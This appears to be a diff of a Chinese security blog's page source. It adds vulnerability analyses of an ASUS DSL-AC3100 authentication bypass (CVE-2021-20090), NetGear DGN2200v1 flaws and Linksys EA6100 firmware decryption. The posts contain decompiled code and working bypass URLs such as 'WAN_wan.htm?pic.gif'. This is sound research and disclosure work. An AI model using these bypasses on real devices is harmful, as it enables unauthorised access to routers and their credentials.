FUN_00014510(iParm1,400,&quot;Invalid or unsupported method.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<script src="/libs/jquery.min.js"></script>
+<blockquote>
+<p>&amp;&amp; ： 逻辑与，前后条件同时满足表达式为真；</p>
+<p>|| ： 逻辑与，前后条件只要有一个满足表达式为真。 </p>
+</blockquote>
+<p>如下面的代码，因为逻辑运算符&amp;&amp; 的优先级大于 || ，因此会先计算 &amp;&amp; 的值。所以要先判断 iParm1 + 0x76a8 的值。如果值不为0 ，则接着执行 逻辑运算符的|| 的表达式。</p>
+<p>(((*(code **)(PTR_PTR_DAT_00054fac + 0x14) &#x3D;&#x3D; (code *)0x0) ||<br>      (iVar3 &#x3D; (**(code **)(PTR_PTR_DAT_00054fac + 0x14))(iParm1), iVar3 !&#x3D; 2)) &amp;&amp;<br>     ((*(int *)(iParm1 + 0x76a8) !&#x3D; 0 || (iVar3 &#x3D; FUN_0001d578(__dest,0,iParm1), iVar3 &#x3D;&#x3D; 0))))</p>
+<p>根据 FUN_00015058() 函数的代码，可以看到 iParm1 + 0x76a8 的值是从  FUN_0000deb0(__dest) 获取到的，而 “_dest” 的值在前面可以看出来是用户请求的 URL。</p>
+<p>如果 iParm1 + 0x76a8 不为0 ，那么就能跳过身份验证的函数**evaluate_access()**，来直接执行处理POST请求的FUN_00014c30函数。 </p>
+<p>接下来进入 FUN_0000deb0() 函数，来查看是怎么处理 URL，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">undefined4 FUN_0000deb0(char *pcParm1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  size_t __n;</span><br><span class="line">  int iVar1;</span><br><span class="line">  char *__s;</span><br><span class="line">  undefined **ppuVar2;</span><br><span class="line">  </span><br><span class="line">  ppuVar2 = &amp;PTR_s_/images/_00054f70;</span><br><span class="line">  __s = PTR_s_/images/_00054f70;</span><br><span class="line">  if (PTR_s_/images/_00054f70 == (undefined *)0x0) &#123;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  do &#123;</span><br><span class="line">    __n = strlen(__s);</span><br><span class="line">    iVar1 = strncasecmp(pcParm1,__s,__n);</span><br><span class="line">    if (iVar1 == 0) &#123;</span><br><span class="line">      return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    ppuVar2 = ppuVar2 + 1;</span><br><span class="line">    __s = *ppuVar2;</span><br><span class="line">  &#125; while (*ppuVar2 != (char *)0x0);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数会将 url 和  &amp;PTR_s_&#x2F;images&#x2F;<em>00054f70 字符串进行比较，直到符合为止，而 &amp;PTR_s</em>&#x2F;images&#x2F;_00054f70  的值是 “&#x2F;images&#x2F;” ，所以只需要请求的URL中带有  “&#x2F;images&#x2F;” 字符串，就可以绕过身份认证函数访问其他页面。</p>
+<p><img src="/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210815170700457.png" alt="image-20210815170700457"></p>
+<p><img src="/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210815170721467.png" alt="image-20210815170721467"></p>
+<p>前面已经分析出来了身份验证绕过的漏洞点，但是并不能绕过验证访问任意界面，因为在访问的时候，需要正确的httoken值。接下来我们来分析设备的httoken 是怎么获取和生成的，在这个设备里，httoken 是设备的token值，并且访问设备的页面需要带有给定的httoken 值。根据漏洞披露来看，httoken 是在服务端进行生成，然后前端js 中进行解密，最终向服务器请求的时候，将httoken加入到请求数据中，但是漏洞披露并没有说明httoken 是那一段字符串生成的。</p>
+<p>我在httpd 的逆向工程中找到了生成httoken 的函数，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">undefined4 FUN_00022520(int iParm1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  int iVar1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  undefined *puVar3;</span><br><span class="line">  size_t sVar4;</span><br><span class="line">  char cStack120;</span><br><span class="line">  undefined auStack119 [107];</span><br><span class="line">  </span><br><span class="line">  memset(&amp;cStack120,0,0x65);</span><br><span class="line">  iVar1 = FUN_00017df0();</span><br><span class="line">  if (iVar1 == -1) &#123;</span><br><span class="line">    uVar2 = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    puVar3 = (undefined *)(iParm1 + 0x7994);</span><br><span class="line">    if (puVar3 == (undefined *)0x0) &#123;</span><br><span class="line">      puVar3 = &amp;DAT_0003d274;</span><br><span class="line">    &#125;</span><br><span class="line">    uVar2 = FUN_000393e0(puVar3);</span><br><span class="line">    sprintf(&amp;cStack120,&quot;%lu&quot;,uVar2);</span><br><span class="line">    sVar4 = strlen(&amp;cStack120);</span><br><span class="line">    FUN_00017e78(&amp;cStack120,sVar4,auStack119 + sVar4,100 - sVar4);</span><br><span class="line">    uVar2 = so_printf(iParm1,</span><br><span class="line">                      &quot;&lt;img title=spacersrc=\&quot;data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7%s\&quot; border=0&gt;&quot;</span><br><span class="line">                      ,auStack119 + sVar4);</span><br><span class="line">  &#125;</span><br><span class="line">  return uVar2;</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们来分析FUN_00022520函数。在函数中我们可以看到最终生成了一个img 标签，并且src 的值是一段“data:image&#x2F;gif;base64,R0lGODlhAQABAIAAAAAAAP&#x2F;&#x2F;&#x2F;yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 + auStack119 + sVar4 ”字符串，而其中 auStack119 + sVar4 的值是从FUN_00017e78 函数中进行base64 以及其他的方式进行处理后的字符串，并且这段字符串就是httoken的值。</p>
+<p>生成的img 标签会在设备的login.html 中html 代码中出现，如下图所示，</p>
+<p><img src="/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210816152015429.png" alt="image-20210816152015429"></p>
+<p>根据生成httoken函数拼接这段字符串的方式，使用脚本对把token 解密出来，可以确定如下图的“372646849” 为设备的 token。</p>
+<p>ArcBase.decode(“image&#x2F;gif;base64,R0lGODlhAQABAIAAAAAAAP&#x2F;&#x2F;&#x2F;yH5BAEAAAAALAAAAAABAAEAAAIBRAA7MTU2OTQzNDE0OA&#x3D;&#x3D;”）</p>
+<p>根据解密出来的信息，“;” 后面的字符串 “ 372646849” 就是设备解密后的httoken 值。</p>
+<h2 id="0x04-ping-命令注入-配置选项"><a href="#0x04-ping-命令注入-配置选项" class="headerlink" title="0x04 ping 命令注入+配置选项"></a>0x04 ping 命令注入+配置选项</h2><p>这一部分，漏洞披露的相对来说比较详细，很多的网络设备中在ping网络诊断 这个功能中，出现过大量的历史漏洞，比如NetGear，D-Link等都出现过此类漏洞，因此关于ping 这一步部分命令拼接就不展开来讲述，但是本漏洞的不同点在于使用设备内部的配置选项ARC_TELNETD_ENABLE 来开启设备的telentd，这一点可以在以后的漏洞挖掘中遇到无法执行命令的时候，提供了不同的执行命令的方式。<br>我们来重点的关注一下ARC_TELNETD_ENABLE 这个配置。在文件 &#x2F;sbin&#x2F;arc_telnetd 文件中可以看到文件内容。文件可以获取ARC_TELNETD_ENABLE的值，当ARC_TELNETD_ENABLE的值为1的时候，设备会开启telnetd。</p>
+<p><img src="/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210815163855557.png" alt="image-20210815163855557"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210817151131987.png" alt="image-20210817151131987"></p>
+<p><img src="/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210817151237633-1702730737615.png" alt="image-20210817151237633"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://tig3rhu.github.io/2023/12/16/CVE-2021-20090(%E5%8D%8E%E7%A1%95DSL-AC3100)%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="clq9l1r3o0001ysvb2vo8halz" data-title="CVE-2021-20090 身份验证绕过漏洞分析" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
 
 
-<script src="/libs/highlight/highlight.pack.js"></script>
 
-<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+  
+    <article id="post-NetGear_DGN2200v1系列漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/12/16/NetGear_DGN2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
+  <time class="dt-published" datetime="2023-12-16T12:34:25.075Z" itemprop="datePublished">2023-12-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/12/16/NetGear_DGN2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">NetGear__DNG2200v1系列漏洞分析</a>
+    </h1>
+  
 
-<script src="/js/js.js"></script>
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="NetGear-DGN2200v1系列漏洞分析"><a href="#NetGear-DGN2200v1系列漏洞分析" class="headerlink" title="NetGear DGN2200v1系列漏洞分析"></a>NetGear DGN2200v1系列漏洞分析</h1><h3 id="获取和解压固件"><a href="#获取和解压固件" class="headerlink" title="获取和解压固件"></a>获取和解压固件</h3><p>固件可从供应商的网站上获得，这使我们更容易获得副本进行检查。它是一个简单的 .zip 文件，包含发行说明 (.html) 和固件映像本身（.chk 文件）。在 .chk 文件上运行binwalk最终提取了文件系统 ( squash-fs )。</p>
+<p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image1.png" alt="image-20231216202735932"></p>
+<p>由器固件文件系统本身是一个标准的 Linux 根文件系统，并添加了一些小功能。我们关心和研究有以下几点</p>
+<ul>
+<li>&#x2F;www  –  包含html页面和.gif图片</li>
+<li>&#x2F;usr&#x2F;sbin – 包含 NETGEAR 的各种自定义二进制文件，包括 HTTPd、FTPC 等</li>
+</ul>
+<p>由于我们看到异常通信使用 httpd 服务的标准端口，因此我们将重点放在 httpd 上。httpd 本身是一个 32 位大端 MIPS ELF，针对 uClibc (嵌入式设备的标准 libc）编译，似乎整个服务器端逻辑 (CGI) 都被编译到 httpd 中。</p>
+<p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image2.png" alt="image-20231216202735932"></p>
+<h3 id="探索"><a href="#探索" class="headerlink" title="探索"></a>探索</h3><p>在探索嵌入式web服务时，首先要考虑以下几个问题</p>
+<ol>
+<li>Web 服务是否显示一些未经身份验证的页面？如果是这样，他们是如何治理的？</li>
+<li>Web 服务如何执行身份验证？</li>
+<li>Web服务是否正确处理请求（即是否存在内存损坏错误）？</li>
+<li>Web 服务是否实施了某些安全措施，例如（反）跨站点请求伪造令牌或内容安全策略？</li>
+</ol>
+<p>为了回答这些问题，我们对 httpd 二进制文件进行了静态分析，并通过运行 QEMU（一个开源模拟器）对固件进行仿真模拟，另外使用了hook（例如 NVRAM getter 和 setter）进行了一些动态分析。</p>
+<h3 id="DGN-2200V1路由器中存在的漏洞"><a href="#DGN-2200V1路由器中存在的漏洞" class="headerlink" title="DGN 2200V1路由器中存在的漏洞"></a>DGN 2200V1路由器中存在的漏洞</h3><h4 id="绕过身份验证访问路由器管理界面"><a href="#绕过身份验证访问路由器管理界面" class="headerlink" title="绕过身份验证访问路由器管理界面"></a>绕过身份验证访问路由器管理界面</h4><p>在检查 httpd 如何规定哪些页面应该在没有身份验证的情况下提供时，我们发现了以下伪代码：</p>
+<p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image3.png" alt="image-20231216202735932"></p>
+<p>这些代码是httpd中的第一个页面处理代码，它会自动允许一些页面，例如form.css或者func.js，正常来说，这些设置并没有问题，但是异常点在于NetGear使用strstr函数来检查是否有“.jpg”“.gif”或者“ess_“字符串，用来匹配整个 url 。<br>因此我们可以使用GET 方式在URL中带有strstr检查的字符串（如 “?.gif” ）来访问设备的任意界面，其中包括身份验证的界面，使用如下</p>
+<p><code>https://ip/WAN_wan.htm?pic.gif</code></p>
+<p>就可以成功绕过身份验证访问路由器管理界面了。</p>
+<h4 id="通过加密侧信道攻击推断路由器凭证"><a href="#通过加密侧信道攻击推断路由器凭证" class="headerlink" title="通过加密侧信道攻击推断路由器凭证"></a>通过加密侧信道攻击推断路由器凭证</h4><p>在这个阶段，我们已经完全控制了路由器管理界面，但是我们继续研究身份验证本身是如何实现的。<br>我们注意到httpd 组件对http界面进行基础认证，需要将username和password 使用base64来进行编译，然后在http header中发送，最后在路由器内存中保存的用户名和密码进行验证，路由器将这些信息存储在NVRAM中。<br>在我们检查身份验证的过程中，我们发现了一种可以让攻击者获取正确凭据的旁道攻击：</p>
+<p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image4.png" alt="image-20231216202735932"></p>
+<p>这里要注意，username 和 password 是使用strcmp来进行比较的，strcmp 在 libc 中的实现是通过逐个字符比较直到观察到 NUL 终止符或直到发生不匹配来工作。</p>
+<p>攻击者可以通过测量失败所需的时间来利用后者。例如，在测量第一个字符的次数时，我们得到如下图：</p>
+<p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image5.png" alt="image-20231216202735932"></p>
+<p>这表示第一个字符是“n”。攻击者可以重复此过程（“na”、“nb”、“nc”等）以获取第二个字符，直到泄露整个用户名和密码。</p>
+<p>我们向 NETGEAR 建议他们可以通过执行基于 XOR 的内存比较来避免此类攻击，例如：</p>
+<p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image6.png" alt="image-20231216202735932"></p>
+<p>使字节不匹配，该功能也会继续。类似的方法可以在加密安全库中看到，例如OpenSSL 的 CRYPTO_memcmp。</p>
+<h4 id="检索存储在设备中的密钥"><a href="#检索存储在设备中的密钥" class="headerlink" title="检索存储在设备中的密钥"></a>检索存储在设备中的密钥</h4><p>当完成身份验证绕过漏洞之后，我们仍然想看看是否可以利用其他现有的漏洞来恢复路由器使用的username和密码，因为我们决定使用路由器的配置备份\恢复功能。<br>我们可以使用身份绕过获取文件：<br><code> hxxp://router_addr:8080/NETGEAR_DGN2200[.]cfg?pic[.]gif.</code><br>这个文件具有高熵，这表明它已被加密，我们无法直接读取内容，并且binwalk也没有任何结果。</p>
+<p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image7.png" alt="image-20231216202735932"></p>
+<p>当我们对“备份\恢复“的功能进行逆向后，我们的问题被解决了。</p>
+<p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image8.png" alt="image-20231216202735932"></p>
+<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><h4 id="Ex6100v2-固件分析"><a href="#Ex6100v2-固件分析" class="headerlink" title="Ex6100v2 固件分析"></a>Ex6100v2 固件分析</h4><p>看完这边漏洞分析文章之后，根据以往对Netgear固件分析中，发现这种情况存在许多版本的固件中，于是我翻出了实验室的NetGear Ex6100v2 路由设备，下载到对应版本的固件，然后对固件进行解包分析，<br>根据&#x2F;etc&#x2F;init.d&#x2F;rcS文件中的内容<br>找到uhttpd 的组件（<br>uHTTPd 是一个 OpenWrt&#x2F;LUCI 开发者从头编写的 Web 服务器），可以看到这个固件是使用NX的保护措施。</p>
+<p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image9.png" alt="image-20231216202735932"></p>
+<p>在我分析&#x2F;etc&#x2F;boot文件中，看到如下内容，也可以证明这是一个OpenWRT类型的web组件。</p>
+<p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image10.png" alt="image-20231216202735932"></p>
+<p>在uhttpd组件的逆向中，看到了如下的伪代码</p>
+<p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image11.png" alt="image-20231216202735932"></p>
+<p>本来以为这也是一个存在身份验证绕过的固件，但是继续查看引用，看到这个函数需要在用户认证之后才会触发</p>
+<p><img src="/NetGear2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image12.png" alt="image-20231216202735932"></p>
+<p>于是在经过实际的测试，确实是需要在经过认证才能访问（鸡肋）</p>
 
-<style type="text/css">
-.v * {
-color: #698fca;
-}
-.v .vlist .vcard .vhead .vsys {
-color: #3a3e4a;
-}
-.v .vlist .vcard .vh .vmeta .vat {
-color: #638fd5;
-}
-.v .vlist .vcard .vhead .vnick {
-color: #6ba1ff;
-}
-.v a {
-color: #8696b1;
-}
-.v .vlist .vcard .vhead .vnick:hover {
-color: #669bfc;
-}
-</style>
-    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://tig3rhu.github.io/2023/12/16/NetGear_DGN2200v1%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="clq9l1r3u0007ysvbaudcb0l2" data-title="NetGear__DNG2200v1系列漏洞分析" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Linksys_EA6100_固件解密分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/12/16/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/" class="article-date">
+  <time class="dt-published" datetime="2023-12-16T12:20:43.030Z" itemprop="datePublished">2023-12-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/12/16/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/">Linksys EA6100 固件解密过程</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>这一次来分享一个对固件解密的文章<br>在一次分析固件的过程中，看到了Linksys EA6100 的一款固件，很不幸，这款固件被加密了，这里接下来将固件解密的过程来做个梳理。</p>
+<h2 id="0x02-固件信息"><a href="#0x02-固件信息" class="headerlink" title="0x02 固件信息"></a>0x02 固件信息</h2><p>首先在固件的下载界面查看固件的版本，这里有两个版本，先不管那么多，全都下载下来，拿到固件 “ FW_EA6100_1.1.6.181939_prod.gpg.img “ ，我看到固件名字，感觉很奇怪，第一次到固件以 “ .gpg.img” 为结尾的固件包，正常的固件包是以 “img”、“bin”、“chk” 为结尾。bing 搜索，发现只能搜到gpg的的相关信息，在了解完了gpg信息后，知道了这是一个为文件生成签名、管理密钥以及验证签名的工具。因此固件很有可能是使用GPG生成的密钥进行加密的。</p>
+<p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210707214022160.png" alt="image-20210707214022160"></p>
+<h2 id="0x03-判断是否被加密"><a href="#0x03-判断是否被加密" class="headerlink" title="0x03 判断是否被加密"></a>0x03 判断是否被加密</h2><p>这里介绍以下判断固件是否加密的一种方式。<br>我们使用的是binwalk来分析<br>根据binwalk的熵分析，可以看到固件处于加密的状态。</p>
+<blockquote>
+<p>熵是用于表达混乱程度的名词，熵值可以表达系统中蕴含的能量，也可用于表达信息中的不确定性。</p>
+</blockquote>
+<p>根据下面的图形可以了解到，“ FW_EA6100_1.1.6.181939_prod.gpg.img ” 固件的熵值几乎为1，属于高熵，说明固件处于被加密的状态。</p>
+<p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210707215634961.png" alt="image-20210707215634961"></p>
+<p>如下图所示，这是一个没有加密的NetGear WiFi拓展器的固件，可以看到熵值有剧烈的上下波动，说明这部分的固件并没有被加密。</p>
+<p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210707220314465.png" alt="image-20210707220314465"></p>
+<h3 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h3><p>使用binwalk 看一下固件的信息，因为固件被加密了，所以啥都看不到。</p>
+<p>同时也file识别不出来</p>
+<p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210707225553391.png" alt="image-20210707225553391"></p>
+<p>当我不知道下一步应该怎么做的时候，发现了下载固件页面中有这么一段话。</p>
+<blockquote>
+<p><strong>IMPORTANT:</strong>  It is <strong>highly recommended</strong> to upgrade the firmware of your router using the <strong>Auto Update</strong> feature.  However, if you prefer to do manual updates and your router is on <strong>1.1.5.162431 or older, YOU MUST download &amp; update your router using firmware version 1.1.5.172244 first before loading the latest firmware</strong>.</p>
+</blockquote>
+<p>在更新最新固件的时候，需要先下载 Ver. 1.1.5 (Build 172244) 作为中间件，来升级到最新的固件，这个设备的最新固件就是Ver. 1.1.6，但是这个固件是加密的，一般来说，需要中间件的情况是用于提供密钥来解密最新的固件，并且FW_EA6100_1.1.5.172244_prod.img 中是没有 “gpg” 后缀的，说明这个固件并没有被加密，这样一来就说的通了。</p>
+<p>根据实际的分析情况来看，这个固件确实没有被加密，可以识别出来文件系统是用 jffs2 压缩方式进行压缩的。</p>
+<p>查看固件的组成结构</p>
+<p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210707225219915.png" alt="image-20210707225219915"></p>
+<p>计算固件熵值</p>
+<p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210707225448879.png" alt="image-20210707225448879"></p>
+<p>file 查看</p>
+<p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210707225532197.png" alt="image-20210707225532197"></p>
+<p>接下来我们直接使用 binwlk -Me 来提取固件jffs2-root 文件系统。</p>
+<p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210707230420894.png" alt="image-20210707230420894"></p>
+<p>我们将 Ver. 1.1.5 (Build 172244) 的固件成功解开了，在这里，我们先了解一下gpg 生成密钥的形式是什么样的。</p>
+<p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210707231205509.png" alt="image-20210707231205509"></p>
+<p>然后我就在固件中包含pub 、rsa 字符串的文件，很不幸，一无所获，找到的都是一些无关的文件。<br>于是我开始检索一些其他的密钥保存的格式之后，一般都是下面的这种方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----  # 私钥内容</span><br><span class="line">... (private key in base64 encoding) ...</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">-----BEGIN CERTIFICATE-----  # 证书信息</span><br><span class="line">... (certificate in base64 PEM encoding) ...</span><br><span class="line">-----END CERTIFICATE-----</span><br></pre></td></tr></table></figure>
+
+<p>于是顺着这个思路，我终于找到了类似 gpg 密钥的文件了，幸运的 “ keydata ” 文件</p>
+<p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210708153712590.png" alt="image-20210708153712590"></p>
+<p>首先将keydata 加载到 系统中的 gpg 中，然后再进行对固件包解密</p>
+<p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210708155023874.png" alt="image-20210708155023874"></p>
+<p>我们成功的得到了解密后的文件，使用binwalk 识别一下固件的信息。</p>
+<p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210708155516962.png" alt="image-20210708155516962"></p>
+<p>现在用binwalk 就可以完全的解开固件包了</p>
+<p><img src="/Linksys_EA6100_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20210708160302575.png" alt="image-20210708160302575"></p>
+<h2 id="0x05总结"><a href="#0x05总结" class="headerlink" title="0x05总结"></a>0x05总结</h2><p>本片文章主要是讲解对固件如何解密的一种方法，这种固件就是以前的固件没有加密，但是后面的固件加密了，在需要解密的情况下，就需要一个中间过渡版本的固件，这个过渡版本的固件中带有解密程序，然后对最新的固件进行解密。</p>
+<p>这里还对固件的文件系统进行了简单的分析，虽然没有发现显著的漏洞，但是这里也简单描述一下。<br>在&#x2F;etc&#x2F;init.d&#x2F;service_httpd.sh 文件中了解到了lighttpd是设备web组件，以及web组件启动的过程。<br>lighttpd 文件是在&#x2F;usr&#x2F;sbin&#x2F;中<br>&#x2F;etc&#x2F;init.d&#x2F;中包含了设备启动初始化所有的启动文件，并且包含一些密钥信息。<br>&#x2F;www&#x2F;ui&#x2F;cgi&#x2F; 文件夹中有一些cgi 文件，但是经过分析，并没有发现有异常的风险点。<br>&#x2F;www&#x2F;ui&#x2F;local 文件夹中主要包含的是路由器设备的前端的html一些文件。<br>逆向分析了一下lighttpd，并没有发现一些风险点，可能是对lighttpd 框架了解的不多，等拜读一下源码，了解那里是二次开发的地方，再来分析这个组件。</p>
+
+      
+    </div>
+    <footer class="article-footer">
